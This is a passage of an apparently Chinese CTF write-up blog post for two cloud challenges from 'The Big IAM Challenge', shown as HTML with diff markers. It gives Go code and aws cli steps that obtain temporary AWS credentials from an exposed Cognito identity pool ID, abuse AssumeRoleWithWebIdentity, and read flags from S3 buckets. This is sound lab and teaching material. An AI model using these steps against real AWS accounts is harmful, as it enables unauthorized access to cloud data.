class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+<p>可以发现该条policy是和AWS Cognito相关的<br><strong>关于AWS Cognito：</strong><br>Amazon Cognito 是 Web 和移动应用程序的身份平台。它是用户目录、身份验证服务器以及 OAuth 2.0 访问令牌和 AWS 凭证的授权服务。使用 Amazon Cognito，您可以对内置用户目录、企业目录以及 Google 和 Facebook 等使用者身份提供者中的用户进行身份验证和授权。要使用 Cognito 需要先创建一个 Amazon Cognito 身份池，然后填入创建的身份池 ID 去调用 SDK 获取临时凭证，最后通过临时凭证去操作资源。<br>首先我们要获取身份池ID，在网页源代码中我们发现了身份池ID<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/bigiam-8.png" srcset="/img/loading.gif" lazyload><br>之后就可以调用sdk通过身份池ID获取临时凭证了，这里简单写了一份go获取临时凭证的代码</p>
+<figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">getAKSKSessionToken</span><span class="hljs-params">(identity <span class="hljs-type">string</span>)</span></span> &#123;<br>	identityPoolID := identity<br>	region := <span class="hljs-string">&quot;us-east-1&quot;</span><br><br>	sess, err := session.NewSession(&amp;aws.Config&#123;<br>		Region: aws.String(region),<br>	&#125;)<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		fmt.Println(<span class="hljs-string">&quot;Error creating session:&quot;</span>, err)<br>		<span class="hljs-keyword">return</span><br>	&#125;<br><br>	cognitoSvc := cognitoidentity.New(sess)<br><br>	input := &amp;cognitoidentity.GetIdInput&#123;<br>		IdentityPoolId: aws.String(identityPoolID),<br>	&#125;<br><br>	idResp, err := cognitoSvc.GetId(input)<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		fmt.Println(<span class="hljs-string">&quot;Error getting identity ID:&quot;</span>, err)<br>		<span class="hljs-keyword">return</span><br>	&#125;<br><br>	identityID := aws.StringValue(idResp.IdentityId)<br><br>	credsInput := &amp;cognitoidentity.GetCredentialsForIdentityInput&#123;<br>		IdentityId: aws.String(identityID),<br>	&#125;<br><br>	credsResp, err := cognitoSvc.GetCredentialsForIdentity(credsInput)<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		fmt.Println(<span class="hljs-string">&quot;Error getting credentials:&quot;</span>, err)<br>		<span class="hljs-keyword">return</span><br>	&#125;<br><br>	accessKey := aws.StringValue(credsResp.Credentials.AccessKeyId)<br>	secretKey := aws.StringValue(credsResp.Credentials.SecretKey)<br>	sessionToken := aws.StringValue(credsResp.Credentials.SessionToken)<br><br>	fmt.Printf(<span class="hljs-string">&quot;Access Key: %s\n&quot;</span>, accessKey)<br>	fmt.Printf(<span class="hljs-string">&quot;Secret Key: %s\n&quot;</span>, secretKey)<br>	fmt.Printf(<span class="hljs-string">&quot;Session Token: %s\n&quot;</span>, sessionToken)<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>将刚刚获得的身份池ID传给这个参数即可获得AK SK和Session Token，之后使用AK SK session Token即可操作s3。可以使用下面的命令配置AK SK SessionToken</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">aws configure set aws_access_key_id xxxx<br>aws configure set aws_secretss_access_key xxxx<br>aws configure set session_token xxxx <br></code></pre></td></tr></table></figure>
+<p>配置好后直接使用aws cli读取policy中的s3即可</p>
+<figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs golang">aws s3 ls s3:<span class="hljs-comment">//wiz-privatefiles/</span><br>aws s3 cp s3:<span class="hljs-comment">//wiz-privatefiles/flag1.txt ./</span><br>cat flag.txt<br></code></pre></td></tr></table></figure>
+<h2 id="One-final-push"><a href="#One-final-push" class="headerlink" title="One final push"></a>One final push</h2><p>此题的policy为</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;Version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2012-10-17&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;Statement&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Principal&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;Federated&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cognito-identity.amazonaws.com&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;sts:AssumeRoleWithWebIdentity&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Condition&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;StringEquals&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;cognito-identity.amazonaws.com:aud&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+<p>题目中有这样一段描述</p>
+<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">Anonymous access no more. <span class="hljs-keyword">Let</span><span class="hljs-comment">&#x27;s see what can you do now.</span><br><br>Now <span class="hljs-keyword">try</span> it <span class="hljs-keyword">with</span> the authenticated role: arn:aws:iam::<span class="hljs-number">092297851374</span>:role/Cognito_s3accessAuth_Role<br></code></pre></td></tr></table></figure>
+<p>也就是说现在匿名的用户时没办法通过身份池ID获取临时凭证的了，但是policy中允许了一个AssumeRoleWithWebIdentity的操作，通过查阅<a target="_blank" rel="noopener" href="https://docs.aws.amazon.com/cli/latest/reference/sts/assume-role-with-web-identity.html">官方文档</a>发现通过该操作可以生成STS，生成STS需要三个信息：</p>
+<ul>
+<li>role-arn </li>
+<li>role-session-name </li>
+<li>web-identity-token</li>
+</ul>
+<p>role-arn在题目描述中已经给出<code>arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role</code>，role-session-name可以随便起，web-identity-token可以通过身份池ID去获得，而且生成Token的相关接口都是公开的，可以被直接调用，不需要授权。<br>首先先使用aws cli根据身份池ID获取<a target="_blank" rel="noopener" href="https://docs.aws.amazon.com/cli/latest/reference/cognito-identity/get-id.html">身份ID</a><br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/bigiam-9.png" srcset="/img/loading.gif" lazyload><br>之后根据身份ID获取<a target="_blank" rel="noopener" href="https://docs.aws.amazon.com/cli/latest/reference/cognito-identity/get-open-id-token.html">web-identity-token</a><br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/bigiam-10.png" srcset="/img/loading.gif" lazyload><br>现在我们就可以通过AssumeRoleWithWebIdentity生成STS了<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/bigiam-11.png" srcset="/img/loading.gif" lazyload><br>之后的步骤其实和上一题差不多，配置aws cli的ak sk sessiontoken。之后使用aws cli先列出s3的bucket 之后读取其中的flag即可<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/bigiam-12.png" srcset="/img/loading.gif" lazyload><br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/bigiam-b.png" srcset="/img/loading.gif" lazyload><br>成功通关<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/bigiam-13.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/640694595">蚁景安全</a></li>
+<li><a target="_blank" rel="noopener" href="https://wiki.teamssix.com/cloudservice/iam/the_big_iam_challenge_writeup.html">teamsSix Wiki</a></li>
+<li><a target="_blank" rel="noopener" href="https://docs.aws.amazon.com/">aws文档</a></li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/cllaoz3760006rcutboqj54yi/" title="CVE-2022-23648漏洞分析">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CVE-2022-23648漏洞分析</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/cllaoz37h000lrcut65vtd9kd/" title="内网横向移动">
+                        <span class="hidden-mobile">内网横向移动</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
